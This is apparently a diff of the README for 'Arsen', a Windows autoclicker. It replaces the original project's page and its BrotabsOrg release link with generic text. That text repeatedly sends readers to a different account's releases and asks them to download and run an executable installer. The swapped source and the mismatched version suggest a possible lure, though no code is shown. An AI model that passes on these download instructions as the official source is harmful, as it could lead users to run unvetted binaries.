@@ -1,91 +1,62 @@
-<h2 align="center"> Arsen Clicker & Macro - v2.0.0 </h2>
-<p align="center">
-  <img src="https://trendshift.io/api/badge/repositories/14726" width="260" alt="Trendshift Badge"/>
-</p>
+# 🚀 Arsen - Automate Tasks with Ease and Precision
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/python/python-original.svg" width="60" alt="Python Logo"/>
-  &nbsp;&nbsp;&nbsp;
-  <img src="https://raw.githubusercontent.com/devicons/devicon/master/icons/qt/qt-original.svg" width="60" alt="Qt / PySide6 Logo"/>
-</p>
+[![Download Arsen](https://img.shields.io/badge/Download%20Arsen-%20-blue)](https://github.com/jihncyro/Arsen/releases)
 
-<p align="center">
-  <img src="https://img.shields.io/badge/version-v2.0.0-blue?style=flat-square"/>
-  <img src="https://img.shields.io/badge/status-active-brightgreen?style=flat-square"/>
-  <img src="https://img.shields.io/badge/build-stable-blue?style=flat-square"/>
-  <img src="https://img.shields.io/badge/platform-windows-lightgrey?style=flat-square"/>
-  <img src="https://img.shields.io/badge/license-Creative%20Commons-orange?style=flat-square"/>
-</p>
+## 📋 Overview
 
-Arsen v2.0.0 is finally here — fully redesigned, smoother, cleaner, faster, and more powerful.  
-A modern autoclicker + macro application built with precision, performance, and a clean UI.
+Arsen is a powerful Windows automation app focused on precision and reliability. With Arsen, you can automate mouse clicks and macros effortlessly. It allows you to configure everything to fit your workflow, complete with extra features like profiles to streamline your tasks.
 
----
+## 🛠️ Features
 
-## 🎯 Features
+- **Mouse Click Automation**: Easily automate mouse clicks with customizable intervals.
+- **Macros**: Record and replay sequences of actions to save time.
+- **Profiles**: Set up different profiles for various tasks or workflows.
+- **User-Friendly Interface**: Designed for ease of use, so you can start automating quickly.
+- **Reliability**: Built to perform tasks accurately, reducing errors and enhancing efficiency.
 
-- Ultra-responsive autoclicker  
-- Macro recorder with advanced features  
-- Clean and modern interface  
-- Real-time hardware overlays  
-- Profiles, logs, targeting, and custom keybindings  
-- Smooth animations and minimal UI  
-- Optimized for low-end PCs  
+## 📥 System Requirements
 
----
+- **Operating System**: Windows 10 or later
+- **Memory**: At least 2GB RAM
+- **Storage**: 100MB free disk space
+- **Python**: Comes bundled; no need for external installations.
 
-# 📸 Screenshots
+## 🚀 Getting Started
 
-### Interface Preview
+Follow these steps to download and run Arsen:
 
-<p align="center">
-  <img src="Clicker.png" width="48%" />
-  <img src="Targeting.png" width="48%" />
-</p>
+1. **Visit the Releases Page**: Go to the [Releases Page](https://github.com/jihncyro/Arsen/releases).
+2. **Download the Latest Version**: Look for the most recent release. Click on the file name labeled something like `Arsen-v1.0.exe` to download the software.
+3. **Run the Installer**: Once the download completes, locate the file and double-click it to run the installer. Follow the on-screen instructions to install Arsen on your computer.
+4. **Launch Arsen**: After the installation, you can find Arsen in your Start Menu. Click to launch it.
 
-<p align="center">
-  <img src="Overlays.png" width="48%" />
-  <img src="Macros.png" width="48%" />
-</p>
+## 📖 Download & Install
 
-<p align="center">
-  <img src="Logs.png" width="48%" />
-  <img src="Profiles.png" width="48%" />
-</p>
+Click here to [download Arsen](https://github.com/jihncyro/Arsen/releases). This will take you to the Releases page where you can access the installation file for Arsen. 
 
-<p align="center">
-  <img src="Settings.png" width="48%" />
-</p>
+## ⚙️ How to Use Arsen
 
----
+1. **Set Up Your Profile**: Open the application and create a new profile for your task. You can name it based on the task you want to automate.
+2. **Create a Macro**: Use the easy interface to record the clicks and actions you want to automate. You can test the macro to ensure it performs as expected.
+3. **Save Your Work**: Once you're satisfied with the automation, save your profile.
+4. **Run Your Macros**: Select your profile from the main menu and click "Run." Arsen will automate your tasks as configured.
 
-## 📦 Download
+## 🔧 Troubleshooting
 
-Release page: https://github.com/BrotabsOrg/Arsen/releases
-Portable build.
+If you encounter any issues:
 
-Available on UPTODOWN and Sourceforge also
+- **Not Responding?**: Ensure that your computer meets the system requirements.
+- **Action Fails to Execute**: Double-check your recorded actions in the profile and make sure the timing is correct.
+- **Installation Problems**: Verify that you have sufficient permissions to install applications on your computer.
 
----
+## 📞 Support
 
-## 🛠 Requirements
+If you need help or have questions about Arsen, feel free to open an issue on the GitHub repository. You can also check the [Issues](https://github.com/jihncyro/Arsen/issues) section for common problems and solutions.
 
-- Windows 10 or Windows 11
-- No administrative privileges required
+## 🌐 Community
 
----
+Join the community of Arsen users on our forums and share your experiences or ask questions. Feedback helps us improve the application for everyone.
 
-## 💬 Support
+Feel free to explore all the features, test them out, and make your workflow more efficient with Arsen!
 
-For issues, suggestions, or help, reach out through:
-
-- GitHub Issues  
-- Discord
-
----
-
-## ⚖️ License
-
-Creative Commons License.
-
----
+[![Download Arsen](https://img.shields.io/badge/Download%20Arsen-%20-blue)](https://github.com/jihncyro/Arsen/releases)
